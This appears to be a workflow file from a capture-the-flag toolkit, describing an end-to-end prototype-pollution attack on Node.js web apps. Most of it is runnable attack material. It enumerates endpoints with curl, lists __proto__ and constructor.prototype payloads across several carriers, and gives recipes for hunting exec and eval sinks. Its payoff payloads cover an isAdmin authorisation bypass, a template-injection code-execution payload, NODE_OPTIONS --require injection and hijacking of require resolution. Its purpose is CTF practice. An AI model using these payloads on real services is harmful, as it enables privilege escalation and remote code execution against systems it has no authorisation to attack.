# Workflow — the bounded end-to-end loop

The command-level run: find the merge, pollute a marker, find the
sink, land the payoff. Each step is one falsifiable probe.

---

## 0. Setup

```bash
python3 tools/classify.py "a JSON body merged into a settings object"
python3 tools/chain_match.py --record $C
python3 tools/state.py $C --category web --target "$BASE" \
  --challenge-name "<real name>" --event "<event>"
```

A matching chain card returns the confirmed probe first — the cards
(SecNotes, Chromatic, TornadoService, NovaCore, Artificial University)
carry the exact carrier + sink that worked.

## 1. Find the merge site

```bash
# black-box: the settings-shaped endpoints
for ep in settings prefs config theme profile me update patch doc import; do
  curl -s -o /dev/null -w "%{http_code} $ep\n" -X POST "$BASE/api/$ep" \
    -H 'Content-Type: application/json' -d '{}'
done

# the carrier fingerprint: does a nested object parse?
curl -s "$BASE/api/settings" -d '{"a":{"b":{"c":1}}}' -H 'Content-Type: application/json'
```

White-box: `grep -rnE 'merge|extend|defaults|assign' src/` — every
`merge(opts, req.body)`/`extend(true,{},req.body)` is a site.

## 2. The marker write — tier 1

```bash
python3 tools/web/pp_probe.py --url "$BASE/api/settings" \
  --body '{"__proto__":{"ppmarker":"v1"}}' \
  --readback "$BASE/api/me"
```

`marker-on-readback` → the write reached `Object.prototype`. Record
`confirms` with the response verbatim.

Nothing on readback → try the depth/carrier/alias ladder:

```bash
# nested depth
{"a":{"__proto__":{"ppmarker":"v1"}}}
{"a":{"b":{"__proto__":{"ppmarker":"v1"}}}}
# the constructor alias
{"constructor":{"prototype":{"ppmarker":"v1"}}}
{"a":{"constructor":{"prototype":{"ppmarker":"v1"}}}}
# the qs carrier
curl "$BASE/api/settings?__proto__[ppmarker]=v1"
curl "$BASE/api/settings?constructor[prototype][ppmarker]=v1"
# the form carrier
curl -X POST "$BASE/api/settings" -d '__proto__[ppmarker]=v1'
# the dotted-path carrier
{"field":"__proto__.ppmarker","value":"v1"}
{"$set":{"__proto__.ppmarker":"v1"}}
{"$rename":{"existing":"__proto__.ppmarker"}}
```

All denied → record `refutes` for this merge site, try the next
settings-shaped endpoint. No second site → the class may be closed;
`decide.py` names the next rung.

## 3. The sink hunt — tier 2

```bash
# name the readable properties the app has
grep -rnE 'opts\.|config\.|\.hasOwnProperty|\|\||\?\?' src/ | \
  grep -vE 'node_modules|test' | head -40

# the compile/spawn/eval call sites
grep -rnE 'new Function|compile\(|render\(|spawn\(|exec|fork\(|require\(|eval\(' src/
```

Each option object on a call site is a sink; each `opts.x || def`
fallback names a readable property. `bundle_miner.py` does the same
on the shipped JS for black-box.

## 4. The payoff write — tier 2

```bash
# authz — pollute the gate's input
POST /api/settings {"__proto__":{"isAdmin":true}}
GET /admin → 200?

# template — pollute the compile field
POST /api/settings {"theme":{"constructor":{"prototype":
 {"outputFunctionName":"x;__append('[PP]');var y"}}}}
GET /rendered → "[PP]..." in HTML

# spawn — pollute the env
POST /api/settings {"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x"}}}
# trigger the spawn endpoint

# require — pollute the resolution
POST /api/settings {"__proto__":{"main":"/tmp/x.js"}}
```

The sink's behaviour is the readback — a 403→200, a marker in HTML,
a spawned process, a fetched flag.

## 5. The type-match check

Pollution values must match the sink's expected type:

```json
{"isAdmin": true}        — boolean for === true
{"role": "admin"}        — string for === 'admin'
{"roles": ["admin"]}     — array for includes
{"perms": {"admin":true}}— object for key lookup
{"timeout": 30000}       — number
{"isAdmin": "true"}      — STRING — fails === true (the common miss)
```

A "didn't work" write that was the wrong type is not a denial — it is
a type miss. The response schema names the real types.

## 6. The blast-radius discipline

Pollution is process-global — every subsequent requester inherits it:

- use a NON-semantic marker first (`ppmarker`, never `admin`).
- on a shared instance, pollute the NARROWEST property (a
  `user.isAdmin` fallback affects only checks on users; a
  `Object.prototype.isAdmin` hits every object — prefer the narrower
  key path if the merge allows one).
- when the sink is destructive (spawn, write), pin the operation to
  your own object.
- record the property you polluted so a cleanup request can unset it
  (`{"__proto__":{"ppmarker":null}}`).

## 7. The stop

- `confirms` + sink-observed → done; `pre-flag` the value the sink
  revealed.
- every merge site's carriers denied → `refutes`; `decide.py` names
  the next rung.
- the write lands but no sink is reachable → `inconclusive` —
  document the write as a finding, escalate for the sink
  (chain_match, writeup_search, a different object type).

## 8. The per-attempt ledger line

```bash
python3 tools/state.py $C --hypothesis "settings-merge-proto" \
  --bug-class web-prototype-pollution
python3 tools/state.py $C --hypothesis-id <id> \
  --probe '{"__proto__":{"ppmarker":"v1"}} → GET /api/me' \
  --result "marker on fresh obj — global write" --status confirmed
```
